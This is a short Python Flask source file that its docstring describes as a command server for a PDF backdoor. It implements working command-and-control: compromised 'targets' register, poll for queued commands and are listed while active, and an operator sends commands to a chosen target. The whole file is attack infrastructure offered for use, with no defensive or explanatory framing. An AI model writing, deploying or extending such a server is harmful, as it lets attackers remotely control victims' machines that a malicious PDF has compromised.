"""
Simple command server for PDF backdoor communication
"""
from flask import Flask, request, jsonify
import threading
import queue
import time

app = Flask(__name__)

# Command queue for each target
command_queues = {}
active_targets = {}

@app.route('/register', methods=['POST'])
def register_target():
    """Register a new target"""
    data = request.json
    target_id = data.get('target_id')
    target_info = data.get('info')
    
    if target_id:
        command_queues[target_id] = queue.Queue()
        active_targets[target_id] = {
            'info': target_info,
            'last_seen': time.time()
        }
        return jsonify({'status': 'registered'})
    
    return jsonify({'status': 'error'}), 400

@app.route('/get_command/<target_id>')
def get_command(target_id):
    """Get command for specific target"""
    if target_id in command_queues:
        try:
            # Update last seen
            active_targets[target_id]['last_seen'] = time.time()
            
            # Get command with timeout
            command = command_queues[target_id].get(timeout=30)
            return command
        except queue.Empty:
            return ""
    
    return "", 404

@app.route('/send_command', methods=['POST'])
def send_command():
    """Send command to target"""
    data = request.json
    target_id = data.get('target_id')
    command = data.get('command')
    
    if target_id in command_queues and command:
        command_queues[target_id].put(command)
        return jsonify({'status': 'sent'})
    
    return jsonify({'status': 'error'}), 400

@app.route('/targets')
def list_targets():
    """List active targets"""
    current_time = time.time()
    active = {}
    
    for target_id, info in active_targets.items():
        if current_time - info['last_seen'] < 300:  # 5 minutes
            active[target_id] = info
    
    return jsonify(active)

def run_server(host='localhost', port=8181):
    """Run the command server"""
    app.run(host=host, port=port, debug=False)

if __name__ == '__main__':
    run_server()

